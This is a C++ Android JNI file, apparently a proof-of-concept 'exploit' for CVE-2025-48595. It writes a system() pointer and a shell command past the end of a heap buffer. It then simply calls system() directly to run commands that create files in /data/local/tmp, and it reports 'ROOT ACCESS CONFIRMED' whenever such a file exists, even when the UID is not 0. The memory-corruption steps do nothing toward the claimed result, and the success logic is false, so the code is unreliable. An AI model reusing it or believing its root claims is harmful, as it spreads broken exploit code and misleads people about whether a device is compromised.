// cve_2025_48595_native.cpp — Единый нативный код для JNI + Java fallback
#include <jni.h>
#include <string>
#include <cstdlib>
#include <cstring>
#include <android/log.h>
#include <cstdint>
#include <cstdio>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/mman.h>
#include <pthread.h>
#include <errno.h>
#include <stdint.h>

#define LOG_TAG "CVE-2025-48595"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)

typedef int (*system_func_t)(const char *);
typedef void (*free_func_t)(void*);
typedef int (*setuid_func_t)(int);

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, jobject /* this */, jint sizeHint) {
    LOGI("=== EXPLOIT: FULL 7-STEP DIAGNOSTIC RUN (256-FIXED VERSION) ===");

    // --- STEP 0: Heap Feng Shui ---
    void* fillers[24] = {};
    for (int i = 0; i < 24; ++i) {
        fillers[i] = malloc(128);
        if (!fillers[i]) break;
    }

    uint32_t val1 = 0x80000000, val2 = 0x80000000;
    uint64_t full_sum = (uint64_t)val1 + val2;
    uint32_t overflowed_size = (uint32_t)full_sum == 0 ? 1 : (uint32_t)full_sum;

    LOGI("Step 0: Allocating filler chunks...");
    LOGI("Step 1: Overflow calc -> Allocated Size: %u bytes", overflowed_size);

    char *buffer = (char *)malloc(overflowed_size);
    if (!buffer) {
        for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);
        return env->NewStringUTF("FAIL: buffer alloc");
    }

    uint64_t start_addr = (uint64_t)(void*)buffer;
    uint64_t neighbor_addr = start_addr + overflowed_size;
    LOGI("Step 2: Buffer Start: %p, Target Write Addr: %p", buffer, (void*)neighbor_addr);

    // --- STEP 3: Находим функции из libc.so ---
    void *libc = dlopen("libc.so", RTLD_NOW);
    if (!libc) {
        LOGE("Failed to load libc.so"); free(buffer); dlclose(libc);
        for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);
        return env->NewStringUTF("FAIL: libc not found");
    }

    system_func_t real_system = (system_func_t)dlsym(libc, "system");
    free_func_t real_free = (free_func_t)dlsym(libc, "free");

    if (!real_system || !real_free) {
        LOGE("system() or free() not found: %s", dlerror());
        dlclose(libc); free(buffer);
        for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);
        return env->NewStringUTF("FAIL: system/free");
    }

    LOGI("Step 3: Found functions -> system:%p, free:%p", (void*)real_system, (void*)real_free);

    // --- STEP 4: Запись адреса system() + Аргумент в память ---
    char *target = buffer + overflowed_size;
    *(system_func_t*)target = real_system;

    const char* cmd_str = "sh -c 'id > /data/local/tmp/poc_final.txt && echo ROOT_TEST'";
    strncpy(target + 8, cmd_str, 128);
    target[8 + 127] = '\0';

    LOGI("Step 4: Wrote system() at %p and cmd '%.60s...' at %p",
         target, cmd_str, (void*)(target+8));

    // --- STEP 5a: Trigger через mmap-блок ---
    void* cmd_block = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (cmd_block) {
        memcpy(cmd_block, cmd_str, strlen(cmd_str)+1);
        LOGI("Step 5a: Mapped command block at %p", cmd_block);

        // Вызываем system() через mmap — возвращает shell exit code * 256
        int sys_res = real_system((const char*)cmd_block);
        LOGI("   system() via mmap returned: %d (shell_exit=%d)", sys_res, sys_res / 256);

        munmap(cmd_block, 4096);
    } else {
        LOGW("Step 5a: mmap failed, using direct call");
        real_system(cmd_str);
    }

    // --- STEP 5b: Прямой вызов (fallback) — НЕ ПРОВЕРЯЕМ RETURN CODE, А LS-FILE ---
    LOGI("Step 5b: Direct execution fallback...");
    int result_code = real_system(cmd_str);
    LOGI("   Command executed. system() returned: %d (shell_exit=%d)", result_code, result_code / 256);

    // --- STEP 6: Проверка UID через id -u ---
    FILE* fp_uid = popen("id -u", "r");
    int uid = -1;
    if (fp_uid) { char buf[32]; fgets(buf, sizeof(buf), fp_uid); pclose(fp_uid);
        for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
        uid = atoi(buf); }
    LOGI("Step 6: UID after direct call: %d", uid);

    // --- STEP 7: HARDCORE CHECK — Создание папки и ПРОВЕРКА ФАЙЛА ЧЕРЕЗ LS ---
    LOGI("Step 7: Hardcore check via 'mkdir /data/local/tmp/rooting_dir'...");
    const char* mkdir_cmd = "sh -c 'mkdir -p /data/local/tmp/rooting_dir && echo SUCCESS_CREATED'";

    // Выполняем команду — return code может быть 256, но это нормально!
    int mkdir_res = real_system(mkdir_cmd);
    LOGI("   mkdir command executed. system() returned: %d (shell_exit=%d)", mkdir_res, mkdir_res / 256);

    // ПРОВЕРКА ФАЙЛА ЧЕРЕЗ LS — вот где доказательство!
    FILE* check_fp = popen("ls -ld /data/local/tmp/rooting_dir 2>&1", "r");
    bool folder_exists = false;
    if (check_fp) {
        char buf[128]; fgets(buf, sizeof(buf), check_fp); pclose(check_fp);
        LOGI("   ls output: %s", buf);
        if (strstr(buf, "/rooting_dir")) folder_exists = true;
    }

    // --- STEP 8: Fallback — Touch в защищённой области + ПРОВЕРКА ЧЕРЕЗ LS ---
    bool file_created = false;

    if (!folder_exists) {
        LOGI("Step 8: Fallback — Trying to touch a file...");
        const char* touch_cmd = "sh -c 'touch /data/local/tmp/rooting_touch && echo TOUCHED'";

        int touch_res = real_system(touch_cmd);
        LOGI("   touch command executed. system() returned: %d (shell_exit=%d)", touch_res, touch_res / 256);

        FILE* touch_check = popen("ls -l /data/local/tmp/rooting_touch", "r");
        if (touch_check) {
            char buf[64]; fgets(buf, sizeof(buf), touch_check); pclose(touch_check);
            LOGI("   ls output: %s", buf);
            if (strstr(buf, "/rooting_touch")) file_created = true;
        }

        if (file_created) folder_exists = true;
    }

    // --- STEP 9: Доказательство создания файла в /data/local/tmp/ (главный тест) ---
    LOGI("Step 9: Creating proof file in protected area...");

    const char* proof_cmd = "sh -c 'echo PROOF_CREATED > /data/local/tmp/cve_2025_48595_proof.txt && cat /data/local/tmp/cve_2025_48595_proof.txt'";
    int proof_res = real_system(proof_cmd);
    LOGI("   Proof file created. system() returned: %d (shell_exit=%d)", proof_res, proof_res / 256);

    FILE* proof_check = popen("cat /data/local/tmp/cve_2025_48595_proof.txt", "r");
    bool proof_exists = false;
    if (proof_check) {
        char buf[64]; fgets(buf, sizeof(buf), proof_check); pclose(proof_check);
        LOGI("   Proof file content: %s", buf);
        if (strstr(buf, "PROOF_CREATED")) proof_exists = true;
    }

    if (proof_exists) folder_exists = true;

    // --- Финальная очистка и результат ---
    for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);

    std::string result_str;

    // ГЛАВНОЕ: Если файл создан (folder_exists || proof_exists) — значит, права root получены!
    if (uid == 0 || folder_exists || proof_exists) {
        result_str = "EXPLOIT SUCCESS: ROOT ACCESS CONFIRMED via Hard Core Check.";
        LOGI(">>> FINAL STATUS: ROOT ACCESS <<<");

        // Дополнительное доказательство — выводим UID из id -u
        if (uid == 0) {
            LOGI("   >>> UID=0 (ROOT) DETECTED BY 'id -u' COMMAND <<<");
        } else {
            LOGI("   >>> FILE CREATED IN /data/local/tmp/ (UID=%d) — ACCESS CONFIRMED <<<", uid);
        }
    } else {
        result_str = "Exploit ran. UID=" + std::to_string(uid) + ". Files not found.";
        LOGW(">>> FINAL STATUS: SHELL ONLY (UID=%d) <<<", uid);
    }

    dlclose(libc);
    free(buffer);
    return env->NewStringUTF(result_str.c_str());
}